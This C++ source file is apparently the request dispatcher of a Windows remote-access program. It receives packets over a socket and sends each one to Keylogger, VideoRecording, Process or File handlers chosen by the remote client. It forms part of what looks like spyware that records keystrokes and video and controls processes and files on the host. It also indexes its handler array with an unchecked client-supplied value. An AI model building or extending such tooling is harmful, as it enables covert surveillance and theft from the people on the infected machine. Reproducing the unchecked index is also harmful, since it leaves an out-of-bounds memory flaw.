#include "RequestHandler.hpp"

#include <iostream>

#include "File.hpp"
#include "Keylogger.hpp"
#include "Process.hpp"
#include "VideoRecording.hpp"

RequestHandler::RequestHandler() {

}

FeatureHandler* RequestHandler::featureHandlers[FEATURE_COUNT] = {
    new Process(),
    new Keylogger(),
    new VideoRecording(),
    new File()
};

DWORD RequestHandler::ProcessClient(LPVOID lpParam) {
    auto clientSocket = reinterpret_cast<SOCKET>(lpParam);

    PacketHeader header{};
    int bytesReceived = recv(clientSocket, reinterpret_cast<char *>(&header), sizeof(header), 0);
    if (bytesReceived <= 0)
    {
        std::cerr << "Failed to receive header from client." << std::endl;
        closesocket(clientSocket);
        return 1;
    }
    featureHandlers[header.request_key]->HandleRequest(clientSocket,header);
    closesocket(clientSocket);
    return 0;
}
